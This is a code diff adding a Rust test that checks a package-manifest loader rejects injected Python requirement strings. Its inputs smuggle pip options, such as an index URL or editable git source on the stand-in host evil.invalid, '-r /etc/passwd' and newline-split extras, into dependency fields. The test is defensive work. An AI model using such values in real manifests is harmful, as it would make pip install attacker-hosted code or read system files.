@@ -1967,3 +1967,29 @@ requests = { version = ">=2.28", extras = ["socks", "use_chardet_on_py3"] }
     let manifest: PackageManifest = toml::from_str(toml_str).unwrap();
     assert_eq!(manifest.python_dependencies.len(), 15);
 }
+
+/// A dependency's Python requirement is one requirement: a version, name or
+/// extra that would add a pip option line, a direct URL or VCS reference, or
+/// an environment marker fails the manifest load.
+#[test]
+fn injected_python_requirements_fail_the_load() {
+    let header = "[package]\npath = \"studio/ctx\"\nname = \"Ctx\"\nversion = \"0.1.0\"\n\n[python_dependencies]\n";
+    for entry in [
+        "numpy = \">=1\\n--index-url https://evil.invalid/simple\"",
+        "numpy = \">=1\\r\\n-e git+https://evil.invalid/x\"",
+        "numpy = \"@ https://evil.invalid/numpy.tar.gz\"",
+        "numpy = \">=1; python_version > '0'\"",
+        "numpy = \"-r /etc/passwd\"",
+        "\"x @ https://evil.invalid/x.tar.gz\" = \"*\"",
+        "\"--extra-index-url\" = \"*\"",
+        "\"numpy\\n--index-url https://evil.invalid\" = \"*\"",
+        "requests = { version = \">=2\", extras = [\"socks]\\n--index-url https://evil.invalid\"] }",
+        "requests = { version = \">=2\", extras = [\"a,b\"] }",
+    ] {
+        let toml_str = format!("{header}{entry}\n");
+        assert!(
+            toml::from_str::<PackageManifest>(&toml_str).is_err(),
+            "loaded {entry}"
+        );
+    }
+}
